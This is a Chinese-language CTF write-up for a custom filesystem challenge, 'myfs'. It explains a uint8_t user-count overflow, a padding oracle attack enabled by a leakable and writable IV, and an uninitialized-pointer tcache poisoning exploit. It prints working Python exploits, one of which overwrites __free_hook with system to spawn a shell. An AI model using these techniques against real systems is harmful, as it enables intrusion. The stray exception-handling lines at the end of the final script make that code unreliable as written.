這題基本上就是考看 code + 找洞，利用相較容易，**flag2** 的問題最明顯，因為沒事不會設計成可以篡改加密的檔案，還做 padding 跟檢查 padding，寫法有夠怪應該是最容易發現。

解掉 **flag1** 也能解 **flag2**，因為 uid 相同直接用 `dec()` 解開就好；解掉 **flag3** 也能解 **flag1, 2**，因為可以透過漏洞構造出 `aar()` 跟 `aaw()`，改 uid or leak key 都可。



### flag1


雖然看似 `mu_cnt` 有擋不能為 `0x100`，但是 `mu_cnt` 因為是 `uint8_t`，因此值只會在 0 ~ 255，不會有 256 的情況。所以當你建立夠多使用者，就能讓你的 uid 變成 0，而檔案存取是看 `uid` 是否相同，所以可以存取到 root 的檔案，拿到 flag。

```c
const uint32_t mu_max_user_cnt = 0x100;
static uint8_t mu_cnt = 0;
MyUser *__new_mu(const char *username, const char *password, MyFile *rootfs_mf)
{
    if (mu_cnt == mu_max_user_cnt)
        return NULL;
}
```



### flag2

加解密過程請看 `my_encrypt()` 與 `my_decrypt()` 的 code。



leak iv:

```c
ssize_t write_mf(MyUser *ms, MyFile *mf)
{
    ...
    if (mf_is_enc(mf))
        return hexdump(mf->data.ino->content, AES_BLOCK_SIZE);
    ...
}
```



overwrite iv:

```c
int read_mf(MyUser *mu, MyFile *mf)
{
    ...
    if (mf_is_enc(mf))
        return read(STDIN_FILENO, mf->data.ino->content, mf->size);
    ...
}
```



因為可以 leak 出加密的檔案 iv 並修改，加上解密時若 padding 不對就會回報 error，因此我們可以透過 padding oracle attack 來爆出明文，exploit 如下：

```python
flag = b'\n\x07\x07\x07\x07\x07\x07\x07'
i = len(flag) + 1
while i < 0x10:
    if sys.argv[1] == 'remote':
        r = remote('edu-ctf.zoolab.org', 30213)
        solve_pow(r)
    else:
        r = process('./myfs')
    
    write_file('test_file_L1')
    cipher = r.recvuntil('/> ', drop=True)
    cipher = bytes.fromhex(cipher.decode())
    
    tmp_cipher = cipher[:-i] + b'\x00'
    for j in range(-i+1, 0, 1):
        tmp_cipher += bytes([ cipher[j] ^ flag[j] ^ i ])

    r.sendline("info test_file_L1")
    try:
        for bt in range(0x100):
            if bt == cipher[-i]:
                continue
            if -i + 1 == 0:
                try_cipher = tmp_cipher[:-i] + bytes([bt])
            else:
                try_cipher = tmp_cipher[:-i] + bytes([bt]) + tmp_cipher[-i+1:]
            
            read_file('test_file_L1', try_cipher)
            dec_file('test_file_L1')
            oracle = r.recv(3)

            if oracle != b'[-]':
                xd = bytes([bt ^ i ^ cipher[-i]])
                if xd.decode() in wl:
                    flag = xd + flag
                    print("[flag]: ", flag)
                    i += 1
                break
    except:
        pass
```



### flag3



`_new_normfile()` 在建立新的 **normfile** 時沒有對 `mf->data.ino->content` 初始化：

```c
MyFile *_new_normfile(uint8_t uid, char *fn)
{
    MyFile *mf = __new_mf();
    mf->uid = uid;
    mf->fn = strdup(fn);
    mf->data.ino = (iNode *) malloc(sizeof(iNode));
    // 這邊應該要多一個: mf->data.ino->content = NULL;
    mf->data.ino->refcnt = 1;
    return mf;
}
```



而在呼叫 `read_mf()` 時若 `mf->data.ino->content` 為 0，基本上等同於 `calloc()`：

```c
int read_mf(MyUser *mu, MyFile *mf)
{
    ...
    
    if (!mf->size || chk_min < 0 || chk_max < 0 || chk_min > nr || chk_max < nr)
        mf->data.ino->content = realloc(mf->data.ino->content, nr + 0x10);
        
	...
}
```



然而因為 heap 一開始沒有什麼資料，因此 `mf->data.ino->content` 預設就會指向 `NULL`，致使在呼叫 `read_mf()` 時不會發生問題。然而一旦 deleted 的檔案到達 16 個，就會觸發 gc 的回收機制，將每個 deleted `MyFile` 給釋放掉，此時若再新增 **normfile**，`mf->data.ino->content` 就未必指向 NULL 了。實際上可以透過這種方式控制 0x30 tcache 中某個 chunk 的 next，在撞 1/16 機率的情況下，可以指定拿到在 heap address 當中的某塊記憶體區塊。

而 `iNode` 的大小剛好是 0x30，如果能夠順利讓 `iNode` 拿到我們所控制的 chunk，並且與某個 `MyFile` 的 `content` 做重疊，就能透過印出/修改 `iNode` 的 pointer 來 leak heap/overwrite content pointer，構造 `aar()` 與 `aaw()` 的 primitive。最後用 `aar()` 讀殘留在 heap 上的 openssl library 位址來 leak libc，以 `aaw()` 寫 `__free_hook` 成 `system` 即可，exploit 如下：

```python
for i in range(0xe):
    create_normfile(str(i))

create_normfile('large_file')
read_file('large_file', 0x408 * b'\x00')

for i in range(0xe):
    delete_file(str(i))

create_normfile('owo')
# gdb.attach(r)
read_file('owo', b'\x50\x3b')

create_normfile('qaq')
read_file('qaq', 0x18 * b'\x00')

write_file('large_file') # overlap with inode of qaq
r.recv(0x10)
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x18a0
info(f"heap: {hex(heap)}")

def aar(addr):
    data = (p64(0)*2 + p64(addr)).ljust(0x408, b'\x00')
    read_file('large_file', data)
    write_file('qaq')

def aaw(addr, content):
    data = (p64(0)*2 + p64(addr)).ljust(0x408, b'\x00')
    read_file('large_file', data)
    read_file('qaq', content.ljust(0x18, b'\x00'))

aar(heap + 0x890)
libc = u64(r.recv(8)) - 0x2d0e00 - 0x1f2000
__free_hook = libc + 0x1eeb28
_system = libc + 0x55410
info(f"libc: {hex(libc)}")
aaw(heap + 0x10, p64(0x0000000100040000))
aaw(__free_hook - 8, b'/bin/sh\x00' + p64(_system))

for i in range(0xf):
    create_normfile(str(i))

for i in range(0xf):
    delete_file(str(i))

delete_file('qaq')
r.interactive()
exit(1)
except Exception as e:
print(e)
```



P.S. 過程中可能會遇到 0x30 tcache `count != 0` 但是 `entrt == NULL` 的情況，因此需要先透過 `aaw()` 來修改 `tcache_perthread_struct` 的內容，才能讓程式繼續執行。



[full exploit and source code](https://github.com/u1f383/Software-Security-2021/tree/master/quals)

